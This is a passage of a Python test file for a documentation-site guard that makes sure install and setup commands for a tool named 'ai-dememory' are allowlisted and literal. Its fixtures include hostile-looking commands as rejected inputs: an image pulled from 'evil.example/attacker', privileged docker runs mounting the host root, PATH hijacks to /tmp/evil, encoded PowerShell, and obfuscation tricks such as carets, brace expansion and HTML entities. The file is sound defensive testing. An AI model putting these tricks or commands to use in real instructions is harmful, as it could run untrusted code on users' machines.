            "winget install ai-dememory",
            "choco install ai-dememory",
            "scoop install ai-dememory",
            "rye add ai-dememory",
            "npx ai-dememory",
            "npm exec ai-dememory",
            "pnpm dlx ai-dememory",
            "bunx ai-dememory",
            "uvx ai-dememory",
        )
        markup = "".join(f"<p><code>{command}</code></p>" for command in commands)
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    f"{markup}</main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "untracked package installer text is forbidden" in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_nonliteral_commands_in_stable_release_blocks(self) -> None:
        commands = (
            "p^ip install example-package",
            "p%EMPTY%ip install example-package",
            "pi\\\np install example-package",
        )
        command_lines = "\n".join(commands)
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "ai-dememory init ~/code/my-memory --wizard</code>",
                    "ai-dememory init ~/code/my-memory --wizard"
                    f"\n{command_lines}</code>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "2.1.1 command block contains an unapproved literal command"
                    in error
                    for error in errors
                ),
                errors,
            )

    def test_guard_rejects_unknown_copyable_release_markers(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "</main>",
                    "<div class=\"code-block\" data-copy-block data-release=\"unreviewed\">"
                    "<pre tabindex=\"0\"><code>echo safe</code></pre></div></main>",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any("unknown release marker 'unreviewed'" in error for error in errors),
                errors,
            )

    def test_guard_rejects_unapproved_package_variants(self) -> None:
        commands = (
            "pipx install ai-dememory==2.1.0rc1",
            "pipx install ai-dememory==2.1.0.post1",
            "pipx reinstall ai-dememory",
            "pipx upgrade ai-dememory",
            "python3 -m pip install --upgrade ai-dememory",
            "pipx install --index-url https://pypi.org/simple ai-dememory",
            "pipx install --pip-args=--pre ai-dememory",
            "python3 -m pip install --extra-index-url https://example.test/simple ai-dememory==2.1.0",
            "pipx install ai-dememory==2.1.0 --index-url https://example.test/simple",
            "pipx install --force ai-dememory==2.1.0 --pip-args=--pre",
            "pipx install AI-DeMemory==2.1.0rc1",
            "python3 -m pip install ai_dememory==2.1.0rc1",
            "pip install ai-dememory",
            "pip3 install ai-dememory",
            "uv pip install ai-dememory",
            "python.exe -m pip install ai-dememory",
            "py -3.12 -m pip install ai-dememory",
            "pipx.exe install ai-dememory",
            "C:\\Tools\\pipx.exe install ai-dememory==2.1.0rc1",
            "C:/Tools/uv.exe tool install ai-dememory",
            "/usr/local/bin/uv tool install ai-dememory",
            "/usr/bin/python3 -m pip install ai-dememory",
            "python -m pip --isolated install ai-dememory",
            "python -m pip -q install ai-dememory",
            "pip --isolated install ai-dememory",
            "pip -q install ai-dememory",
            "pipx --global install ai-dememory",
            "pipx --verbose install ai-dememory",
            "uv --offline tool install ai-dememory",
            "python -m pipx --global install ai-dememory",
            "python -m uv --offline tool install ai-dememory",
            "py -3.12 -m uv --offline tool install ai-dememory",
            "pipx install ai-'dememory'",
            "custom-wrapper pipx install ai-'dememory'",
            "custom-wrapper pipx install ai-$'dememory'",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    f"{command}\nai-dememory version-check 2.1.1\n",
                    "2.1.1",
                    "fixture",
                )
                self.assertTrue(
                    any(
                        "not allowlisted" in error or "literal shell syntax" in error
                        for error in errors
                    )
                )

    def test_guard_allows_unpinned_package_commands(self) -> None:
        for command in (
            "pipx install ai-dememory",
            "pipx install --force ai-dememory",
            "uv tool install ai-dememory",
            "python3 -m pip install ai-dememory",
            "py -3 -m pip install ai-dememory",
        ):
            with self.subTest(command=command):
                self.assertEqual(
                    [],
                    _stable_command_errors(
                        command,
                        "2.1.1",
                        "fixture",
                        source_version="2.1.1",
                    ),
                )

    def test_guard_does_not_count_echo_or_comment_as_release_commands(self) -> None:
        for prefix in ("echo ", "# "):
            with self.subTest(prefix=prefix), tempfile.TemporaryDirectory() as temporary:
                copied = Path(temporary) / "site"
                shutil.copytree(SITE_ROOT, copied)
                for page in copied.rglob("*.html"):
                    page.write_text(
                        page.read_text(encoding="utf-8").replace(
                            "pipx install ai-dememory",
                            f"{prefix}pipx install ai-dememory",
                        ),
                        encoding="utf-8",
                    )

                errors = audit_site(REPO_ROOT, copied)

                self.assertTrue(any("command block is missing 'pipx install ai-dememory'" in error for error in errors))

    def test_guard_rejects_corruption_of_one_site_entrypoint(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            home = copied / "index.html"
            home.write_text(
                home.read_text(encoding="utf-8").replace(
                    "pipx install ai-dememory",
                    "echo pipx install ai-dememory",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(
                any(
                    "site/index.html: required executable stable command is missing"
                    in error
                    for error in errors
                )
            )

    def test_guard_allows_mcp_config_without_runtime_version_gate(self) -> None:
        for command in (
            "ai-dememory mcp-config --client codex",
            'ai-dememory --root "/tmp/My Vault" mcp-config --client codex',
        ):
            with self.subTest(command=command):
                self.assertEqual(
                    [],
                    _stable_command_errors(command, "2.1.1", "fixture", source_version="2.1.1"),
                )

        for command in (
            "ai-dememory mcp-config --client codex; echo reviewed",
            "ai-dememory mcp-config --client codex && echo reviewed",
            "ai-dememory mcp-config --client codex | Out-File config.toml",
        ):
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.1", "fixture")
                self.assertTrue(any("shell chaining or redirection" in error for error in errors))

    def test_guard_rejects_shell_whitespace_wrappers_and_hidden_continuations(self) -> None:
        fixtures = {
            "vertical-tab": "ai-dememory\vmcp-config --client codex",
            "form-feed": "ai-dememory\fmcp-config --client codex",
            "no-break-space": "ai-dememory\u00a0mcp-config --client codex",
            "figure-space": "ai-dememory\u2007mcp-config --client codex",
            "narrow-no-break-space": "ai-dememory\u202fmcp-config --client codex",
            "powershell-call": "& ai-dememory mcp-config --client codex",
            "bash-package-continuation": (
                "pipx install \\\n  ai-dememory==2.1.1"
            ),
        }
        for label, command in fixtures.items():
            with self.subTest(label=label):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(errors)
                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "unsupported shell whitespace",
                            "PowerShell call operator",
                            "not allowlisted",
                            "shell chaining or redirection",
                        )
                    )
                )

    def test_guard_normalizes_powershell_unicode_quote_delimiters(self) -> None:
        for opening, closing in (
            ("\u2018", "\u2019"),
            ("\u201a", "\u201b"),
            ("\u201c", "\u201d"),
        ):
            command = (
                f"& {opening}C:\\Tools\\pipx.exe{closing} "
                "install ai-dememory"
            )
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("PowerShell call operator" in error for error in errors))
                self.assertTrue(any("not allowlisted" in error for error in errors))

    def test_guard_recognizes_forward_compatible_versioned_python_paths(self) -> None:
        command = (
            "C:\\Tools\\python3.14.exe -m ai_dememory_tool mcp --stdio "
            "--require-bound-root --require-version 2.1.0"
        )
        errors = _stable_command_errors(command, "2.1.0", "fixture")
        self.assertTrue(any("internal Python CLI API" in error for error in errors))

    def test_guard_rejects_wrapped_or_chained_mcp_commands(self) -> None:
        fixtures = (
            "cd ~/vault && ai-dememory mcp-config --client codex",
            "ai-dememory doctor && ai-dememory mcp-config --client codex",
            '& "ai-dememory" mcp-config --client codex --require-version 2.1.0',
            "echo ok && ai-dememory mcp-config --client codex --require-version 2.1.0",
            "sudo ai-dememory mcp-config --client codex --require-version 2.1.0",
            "command ai-dememory mcp-config --client codex --require-version 2.1.0",
            "env X=1 ai-dememory mcp-config --client codex --require-version 2.1.0",
            "PATH=/tmp/evil ai-dememory --root /good mcp-config --client codex --require-version 2.1.0",
            "env PATH=/tmp/evil ai-dememory --root /good mcp-config --client codex --require-version 2.1.0",
            "cmd /c ai-dememory mcp-config --client codex --require-version 2.1.0",
            'pwsh -Command "ai-dememory mcp-config --client codex --require-version 2.1.0"',
            "custom-wrapper ai-dememory mcp-config --client codex --require-version 2.1.0",
            'custom-wrapper ai-dememory mcp-"config" --client codex --require-version 2.1.0',
            "python /tmp/evil/ai_dememory.py --root /good mcp-config --client codex --require-version 2.1.0",
            "python 'C:\\evil\\ai_dememory.py' --root C:/good mcp-config --client codex --require-version 2.1.0",
            'custom-wrapper ai-"dememory" mcp-config --client codex --require-version 2.1.0',
            "custom-wrapper ai-dememory mcp-$'config' --client codex --require-version 2.1.0",
            "$CLI mcp-config --client codex --require-version 2.1.0",
            (
                "custom-wrapper \\\n"
                "  ai-dememory mcp-config --client codex --require-version 2.1.0"
            ),
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(
                    command,
                    "2.1.0",
                    "fixture",
                    require_explicit_mcp_root=True,
                )
                self.assertTrue(errors)
                self.assertTrue(
                    any(
                        marker in error
                        for error in errors
                        for marker in (
                            "shell chaining or redirection",
                            "PowerShell call operator",
                            "explicit vault",
                            "not an analyzable ai-dememory command",
                            "literal shell syntax",
                        )
                    )
                )

    def test_guard_validates_sensitive_commands_inside_inline_code(self) -> None:
        allowed = (
            "Use `ai-dememory mcp-config --client codex` after review.",
            "Use <code>ai-dememory mcp-config --client codex</code> after review.",
            "`ai-dememory setup wizard`",
            "`ai-dememory setup plan --json`",
        )
        for text in allowed:
            with self.subTest(text=text):
                self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

        rejected = (
            "`ai-dememory version-check 0.0.0`",
        )
        for text in rejected:
            with self.subTest(text=text):
                self.assertTrue(_stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_rejects_wrapped_exact_version_checks(self) -> None:
        errors = _stable_command_errors(
            "custom-wrapper ai-dememory version-check 2.1.0",
            "2.1.0",
            "fixture",
        )
        self.assertTrue(any("not an analyzable ai-dememory command" in error for error in errors))

    def test_guard_rejects_markdown_that_visually_concatenates_sensitive_tokens(self) -> None:
        fixtures = (
            "do**ck**er run --rm ai-dememory:local",
            'pw**sh** -NoProfile -Command "Write-Output (Get-Date)"',
            "ai&#45;dememory mcp&#45;config --client codex",
            "ai&hyphen;dememory version&#45;check 0.0.0",
            "ai-dememory mcp-**config** --client codex",
            "ai-dememory setup **wizard**",
            "ai-dememory setup [plan](https://github.com) --json",
            "pipx install ai-[dememory](https://github.com)",
            "ai-dememory mcp-<!--x-->config --client codex",
            "ai-dememory mcp-<span>config</span> --client codex",
            "ai-d&#101;memory mcp-config --client codex",
            "ai-dememory mcp-conf&#105;g --client codex",
            "&#97;&#105;&#45;&#100;&#101;&#109;&#101;&#109;&#111;&#114;&#121; &#109;&#99;&#112;&#45;&#99;&#111;&#110;&#102;&#105;&#103; --client codex",
            "ai-d**e**memory mcp-config --client codex",
            "ai-dememory mcp-conf**i**g --client codex",
            "ai-d[e](https://github.com/)memory mcp-config --client codex",
            "ai-d[e][x]memory mcp-conf[i][y]g --client codex",
            "ai-d[e][]memory mcp-conf[i][]g --client codex",
            "ai-d[e]memory mcp-conf[i]g --client codex",
            "ai-d~~e~~memory mcp-conf~~i~~g --client codex",
            "ai-d<!--x-->ememory mcp-config --client codex",
            "ai-d<span>e</span>memory mcp-config --client codex",
            'ai-d<span data-x=">">e</span>memory mcp-conf<span data-x=">">i</span>g --client codex',
            "ai-d<!DOCTYPE html>ememory mcp-conf<!DOCTYPE html>ig --client codex",
            "ai-d<?x?>ememory mcp-conf<?x?>ig --client codex",
            "pipx install ai-d&#101;memory",
            "pipx install ai-d**e**memory",
            "ai-d[e](https://example.com/(x))memory mcp-config --client codex",
            "ai-dememory mcp-conf[i](https://example.com/(x))g --client codex",
            "pipx install ai-d[e](https://example.com/(x))memory",
            "ai-d[**e**]memory mcp-config --client codex\n\n[**e**]: https://example.com",
            "ai-dememory mcp-conf[**i**]g --client codex\n\n[**i**]: https://example.com",
            "pipx install ai-d[**e**]memory\n\n[**e**]: https://example.com",
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("literal" in error for error in errors))

        inline_encoded = (
            "Use `ai-d&#101;memory mcp-conf&#105;g --client codex`.",
            "Use <code>ai-d&#x65;memory mcp-conf&#x69;g --client codex</code>.",
        )
        for text in inline_encoded:
            with self.subTest(text=text):
                self.assertTrue(_stable_command_errors(text, "2.1.0", "fixture"))

        multiline_comment = "ai-d<!--\nreview marker\n-->ememory mcp-config --client codex"
        errors = _stable_command_errors(multiline_comment, "2.1.0", "fixture")
        self.assertTrue(any("Markdown-free" in error for error in errors))

    def test_guard_rejects_commands_created_by_rendered_softbreaks(self) -> None:
        fixtures = (
            "Use `ai-dememory\nmcp-config --client codex`",
            "Use `pipx install\nai-dememory`",
            "Use <code>ai-dememory\nmcp-config --client codex</code>",
            "ai-dememory\nmcp-config --client codex",
            "pipx install\nai-dememory",
            "Use `ai-dememory`\n`mcp-config --client codex`",
            "Use [ai-dememory](https://example.com)\n[mcp-config](https://example.com) --client codex",
        )
        for text in fixtures:
            with self.subTest(text=text):
                errors = _stable_command_errors(text, "2.1.0", "fixture")
                self.assertTrue(errors)

        shell_fixtures = (
            "docker run --rm\nai-dememory:local",
            "docker --context default\nrun --rm\nai-dememory:local",
            "docker\nrun --rm\nai-dememory:local",
            "docker\nrun\n--rm\n--name\nreviewed\nai-dememory:local",
            "docker\nrun\n--rm\n--label\none\n--label\ntwo\n--label\nthree\n--label\nfour\n--label\nfive\nai-dememory:local",
            'bash -c "docker\nrun --rm ai-dememory:local"',
            "D=docker;\n$D run --rm ai-dememory:local",
            "D=do\\cker;\n`$D` run --rm ai-dememory:local",
            "R=runtime;\n$R run --rm ai-dememory:local",
            "`$D`\nrun --rm ai-dememory:local",
        )
        for text in shell_fixtures:
            with self.subTest(text=text):
                errors = _stable_command_errors(text, "2.1.0", "fixture")
                self.assertTrue(
                    any("soft line breaks" in error for error in errors),
                    errors,
                )

    def test_guard_allows_nonexecuting_assignment_softbreak_prose(self) -> None:
        text = "D=docker;\n$D images are reviewed documentation artifacts."

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_nonexecuting_expanded_launcher_prose(self) -> None:
        text = "$D images are reviewed documentation artifacts."

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_long_noncommand_softbreak_prose(self) -> None:
        text = "\n".join(
            (
                "Docker",
                "documentation is reviewed before publication.",
                "These notes describe local development only.",
                "They do not contain an executable example.",
                "The rendered paragraph remains ordinary prose.",
                "No command is reconstructed across these lines.",
                "Additional prose remains descriptive.",
                "It does not turn into an executable instruction.",
                "The text continues as a normal paragraph.",
                "Readers receive no shell invocation from it.",
                "The bounded scan must keep this control benign.",
                "The final sentence completes the paragraph.",
                "No command appears after the window either.",
            )
        )

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_allows_docker_prose_with_later_run_words(self) -> None:
        text = "\n".join(
            (
                "Docker smoke also",
                "verifies the generated image documentation.",
                "Docker schedule plan --json is a separate review topic.",
                "Run ai-dememory dev publish-guard before merging.",
            )
        )

        self.assertEqual([], _stable_command_errors(text, "2.1.0", "fixture"))

    def test_guard_rejects_dynamic_shell_token_concatenation(self) -> None:
        fixtures = (
            "$D run --rm ai-dememory:local",
            "& $D run --rm ai-dememory:local",
            "ai-dememory mcp$@-config --client codex",
            "ai$@-dememory mcp-config --client codex",
            "pipx install ai-d$@ememory",
            "ai-dememory mcp$()-config --client codex",
            "ai-dememory mcp%EMPTY%-config --client codex",
            "ai-dememory mcp-{c..c}onfig --client codex",
            "ai-{d..d}ememory mcp-config --client codex",
            "pipx install ai-d{e..e}memory",
            "ai-dememory mcp-con{f..f}ig --client codex",
            "ai-dememory m{c..c}p-config --client codex",
            "ai-dememory setup wi{z..z}ard",
            "ai-dememory version-che{c..c}k 2.1.0",
            "ai-dememory setup wi$''zard",
            "ai-dememory setup wi${UNSET}zard",
            "ai-dememory setup wi$(true)zard",
            "ai-dememory setup wi%X%zard",
            "ai-dememory setup wi!X!zard",
            "a$''i-dememory setup wizard",
            "ai^-dememory mcp^-config --client codex",
            "ai-dememory setup w^izard",
            "ai-dememory setup pla^n",
            "ai-dememory m^cp-config --client codex",
            "ai-dememory v^ersion-check 2.1.0",
            "a^i-dememory setup wizard",
            "pipx install ai-de^memory",
            "& ('ai-'+'dememory') ('mcp-'+'config') --client codex",
            "D=docker $D run --rm ai-dememory:local",
            'D=docker; "$D" run --rm ai-dememory:local',
            'D=docker; "$D" --context default run --rm ai-dememory:local',
            "D=doc${EMPTY}ker $D run --rm ai-dememory:local",
            "export D=docker; ${D} run --rm ai-dememory:local",
            "$D = 'docker'; & $D run --rm ai-dememory:local",
            "set D=docker & %D% run --rm ai-dememory:local",
            'set "D=docker" & %D% run --rm ai-dememory:local',
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("literal shell syntax" in error for error in errors))

    def test_guard_rejects_expanded_docker_launcher_in_code_span(self) -> None:
        errors = _stable_command_errors("`$D` run --rm ai-dememory:local", "2.1.0", "fixture")

        self.assertTrue(any("code spans with shell tokens" in error for error in errors))

    def test_guard_allows_nonexecuting_shell_assignment(self) -> None:
        command = '$env:AI_DEMEMORY_ROOT = "C:\\vault"'
        self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

    def test_guard_rejects_backtick_code_spans_used_as_shell_fragments(self) -> None:
        fixtures = (
            "ai`-dememory mcp`-config --client codex",
            "ai-dememory setup `wizard`",
            "ai-dememory setup `wizard",
            "ai-dememory mcp`-config --client codex",
            "ai-dememory version`-check 2.1.0",
            "pipx install ai-de`memory",
        )
        for command in fixtures:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(
                    any(
                        "code spans" in error or "literal shell syntax" in error
                        for error in errors
                    )
                )

    def test_guard_allows_wizard_and_plan_without_runtime_version_gate(self) -> None:
        for command in (
            "ai-dememory --root ~/vault setup wizard",
            "ai-dememory --root ~/vault setup wizard --require-version 2.1.0rc1",
            "ai-dememory --root ~/vault setup plan --json",
            "ai-dememory --root ~/vault setup plan --json --require-version 2.1.0rc1",
            "ai-dememory init ~/vault --wizard",
            "ai-dememory init ~/vault --wizard --require-version 0.0.0",
        ):
            with self.subTest(command=command):
                self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

        for command in (
            "ai-dememory setup wizard && echo reviewed",
            "ai-dememory setup plan --json && echo reviewed",
            "ai-dememory init ~/vault --wizard && echo reviewed",
        ):
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("must not contain shell chaining" in error for error in errors))

    def test_guard_requires_root_and_lease_on_direct_mcp_server(self) -> None:
        rejected = (
            "ai-dememory mcp --stdio",
            "AI_DEMEMORY_ROOT=~/vault ai-dememory mcp --stdio",
            "printf x | ai-dememory mcp --stdio",
            "ai-dememory --root ~/vault mcp --stdio",
            "ai-dememory --root /good mcp --stdio",
            "/tmp/ai-dememory --root /good mcp --stdio",
            "C:/Tools/ai-dememory.exe --root C:/good mcp --stdio",
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("direct MCP server" in error for error in errors))
        self.assertEqual(
            [],
            _stable_command_errors(
                "printf x | ai-dememory --root ~/vault mcp --stdio --require-bound-root",
                "2.1.0",
                "fixture",
            ),
        )

        rejected_operators = (
            "ai-dememory mcp --stdio && echo pwn",
            "echo ok && ai-dememory mcp --stdio",
            "ai-dememory mcp --stdio > out.txt",
            "printf x | ai-dememory mcp --stdio | cat",
        )
        for command in rejected_operators:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("only one stdin pipe" in error for error in errors))

        rejected_environment_wrappers = (
            "PATH=/tmp/evil ai-dememory --root /good mcp --stdio",
            "env PATH=/tmp/evil ai-dememory --root /good mcp --stdio",
        )
        for command in rejected_environment_wrappers:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("not an analyzable" in error for error in errors))

        rejected_unbounded_lease = (
            "ai-dememory --root /good mcp --stdio --require-bound-root --idle-timeout-seconds 0",
            "ai-dememory --root /good mcp --stdio --require-bound-root --idle-timeout-seconds=-1",
        )
        for command in rejected_unbounded_lease:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("positive idle lease" in error for error in errors))

    def test_guard_rejects_raw_docker_mcp_servers(self) -> None:
        rejected = (
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local",
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local mcp --stdio",
            "docker run --rm -i -e AI_DEMEMORY_ROOT=/memory -v /vault:/memory ai-dememory:local mcp --stdio --require-version 2.1.0",
            "docker run --rm evil.example/attacker/ai-dememory:latest mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "docker run --privileged -v /:/memory ai-dememory:local mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "docker run --entrypoint /bin/sh ai-dememory:local mcp --stdio --idle-timeout-seconds 600 --require-version 2.1.0 --profile core --require-bound-root",
            "sudo docker run --privileged -v /:/memory ai-dememory:local",
            "env docker run --rm -i -v /vault:/memory ai-dememory:local",
            "command docker run --rm -i -v /vault:/memory ai-dememory:local",
            "wsl docker run --rm -i -v /vault:/memory ai-dememory:local",
            "/usr/bin/docker run --rm -i -v /vault:/memory ai-dememory:local",
            '"C:/Program Files/Docker/docker.exe" run --rm -i -v C:/vault:/memory ai-dememory:local',
            'bash -c "docker run --rm -i -v /vault:/memory ai-dememory:local"',
            '/bin/bash -lc "docker run --rm -i -v /vault:/memory ai-dememory:local"',
            '"C:\\Program Files\\Git\\bin\\bash.exe" -lc "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'cmd /c "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'cmd /k "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'pwsh -Command "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'pwsh -c "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'powershell -command "docker run --rm -i -v C:/vault:/memory ai-dememory:local"',
            'bash -c "echo reviewed" ; pwsh -Command "docker run ai-dememory:local"',
            'bash -c "\'" ; pwsh -Command "docker run ai-dememory:local"',
            'bash -c \'pwsh -Command "docker run ai-dememory:local"\'',
            r".\tools\docker.exe run --rm ai-dememory:local",
            r"..\tools\docker.exe run --rm ai-dememory:local",
            r"\\server\share\docker.exe run --rm ai-dememory:local",
            r"\\?\UNC\server\share\docker.exe run --rm ai-dememory:local",
            r'pwsh -NoProfile -Command ".\tools\docker.exe run --rm ai-dememory:local"',
            r'pwsh -NoProfile -Command "\\server\share\docker.exe run --rm ai-dememory:local"',
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("raw docker run" in error for error in errors))

    def test_guard_fails_closed_on_opaque_nested_shell_execution(self) -> None:
        rejected = (
            "powershell -EncodedCommand ZQBjAGgAbwAgAHIAZQB2AGkAZQB3AGUAZAA=",
            "powershell -File scripts/review.ps1",
            "bash scripts/review.sh",
            "cmd /q",
            'bash -c "\'"',
            "bash -c '$(docker run --rm ai-dememory:local)'",
            "bash -c 'eval \"docker run --rm ai-dememory:local\"'",
            'env BASH_ENV=review.sh bash -c "echo reviewed"',
            'bash -i --rcfile=review.sh -c "echo reviewed"',
            'pwsh -Command "& ./review.ps1"',
            'pwsh -NoProfile -Command "Write-Output (Get-Date)"',
            "cmd /c scripts\\review.cmd",
            "cmd /c %RUN_AI_DEMEMORY%",
        )
        for command in rejected:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(
                    any("nested shell execution cannot be fully inspected" in error for error in errors)
                )

        over_depth = "docker run --rm ai-dememory:local"
        for _ in range(NESTED_SHELL_MAX_DEPTH + 1):
            over_depth = shlex.join(("bash", "-c", over_depth))
        errors = _stable_command_errors(over_depth, "2.1.0", "fixture")
        self.assertTrue(
            any("nested shell execution cannot be fully inspected" in error for error in errors)
        )

    def test_guard_allows_fully_inspectable_benign_shell_wrappers(self) -> None:
        commands = (
            '/bin/bash -c "echo reviewed"',
            'cmd /d /k "echo reviewed"',
            'pwsh -NoProfile -Command "Write-Output reviewed"',
            "PowerShell users can run the equivalent command below.",
            "Bash users can run the equivalent command below.",
            "command -v bash",
            "sudo -u bash echo reviewed",
            "wsl --distribution bash echo reviewed",
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual([], _stable_command_errors(command, "2.1.0", "fixture"))

    def test_guard_requires_tls_in_non_loopback_api_guidance(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "site"
            shutil.copytree(SITE_ROOT, copied)
            security = copied / "security" / "index.html"
            security.write_text(
                security.read_text(encoding="utf-8").replace(
                    " plus both <code>--tls-cert</code> and <code>--tls-key</code>",
                    "",
                    1,
                ),
                encoding="utf-8",
            )

            errors = audit_site(REPO_ROOT, copied)

            self.assertTrue(any("non-loopback API guidance" in error for error in errors))

    def test_guard_rejects_root_overrides_for_every_sensitive_command(self) -> None:
        commands = (
            "ai-dememory --root good mcp-config --client codex --root evil --require-version 2.1.0",
            "ai-dememory --root good setup wizard --root evil --require-version 2.1.0",
            "ai-dememory setup plan --root good --root evil --require-version 2.1.0",
            "ai-dememory --root good mcp --root evil --stdio --require-version 2.1.0",
            "ai-dememory --root good init vault --wizard --root evil --require-version 2.1.0",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("must not override --root" in error for error in errors))

    def test_guard_rejects_abbreviated_security_options(self) -> None:
        commands = (
            "ai-dememory mcp-config --client generic --require-version 2.1.0 --root good --ro evil",
            "ai-dememory mcp --stdio --require-version 2.1.0 --root good --ro evil",
            "ai-dememory setup wizard --require-version 2.1.0 --root good --ro evil",
            "ai-dememory init C:/vault --wiz --require-version 2.1.0",
            "ai-dememory mcp --std --require-v=2.1.0",
            "ai-dememory mcp-config --client generic --require-version 2.1.0 --im=--privileged",
            "ai-dememory mcp-config --cl=generic --require-version 2.1.0",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("argparse abbreviations" in error for error in errors))

    def test_guard_rejects_ephemeral_package_runners(self) -> None:
        commands = (
            "pipx run ai-dememory",
            "uvx ai-dememory",
            "uv tool run ai-dememory",
            "uv run --with ai-dememory ai-dememory --help",
            "uv run --with ai-dememory==2.1.0 ai-dememory --help",
            "uv run --with=ai-dememory ai-dememory --help",
            "python -m uv run --with ai-dememory ai-dememory --help",
            "python -m pipx run ai-dememory",
            "py -3.12 -m pipx run ai-dememory",
            "custom-wrapper pipx run ai-dememory",
            "pipx.exe run ai-dememory",
            "C:\\Tools\\pipx.exe run ai-dememory",
            "uvx.exe ai-dememory",
            "C:/Tools/uvx.exe ai-dememory",
            "/usr/bin/uvx ai-dememory",
            "/usr/bin/pipx run ai-dememory",
            "/usr/bin/uv run --with ai-dememory ai-dememory --version",
            "pipx --global run ai-dememory",
            "uv --offline run --with ai-dememory ai-dememory --version",
            "python -m pipx --quiet run ai-dememory",
            "python -m uv --offline run --with ai-dememory ai-dememory --version",
            "py -3.12 -m uv --offline run --with ai-dememory ai-dememory --version",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
                self.assertTrue(any("ephemeral package runners" in error for error in errors))

    def test_guard_rejects_internal_python_cli_execution(self) -> None:
        commands = (
            'python -c "from ai_dememory_tool.cli import main; main([\'setup\',\'wizard\'])"',
            'python -c "__import__(\'ai_dememory_tool.cli\').cli.main([\'setup\',\'plan\'])"',
            "python -m ai_dememory_tool.cli setup wizard",
            "python -m ai_dememory_tool.admin.setup_plan plan --json",
            "python -m ai_dememory_tool.admin.onboarding --json",
            "python -m ai_dememory_tool.mcp_server.memory_mcp --stdio --root ~/vault",
            'python -c "from ai_dememory_tool.admin import setup_plan; setup_plan.main([\'plan\'])"',
            "python scripts/setup_plan.py plan --json",
            "py -3 scripts/setup_plan.py plan --json",
            "python scripts/onboarding.py --json",
            "python mcp/server/memory_mcp.py --stdio --root ~/vault",
            "/usr/bin/python3 -m ai_dememory_tool.admin.setup_plan plan --json",
            "C:/Python312/python.exe -m ai_dememory_tool.admin.setup_plan plan --json",
            "C:\\Python312\\python.exe scripts/setup_plan.py plan --json",
            "/usr/bin/python scripts/onboarding.py --json",
            "env /usr/bin/python3 -m ai_dememory_tool.mcp_server.memory_mcp --stdio",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = _stable_command_errors(command, "2.1.0", "fixture")
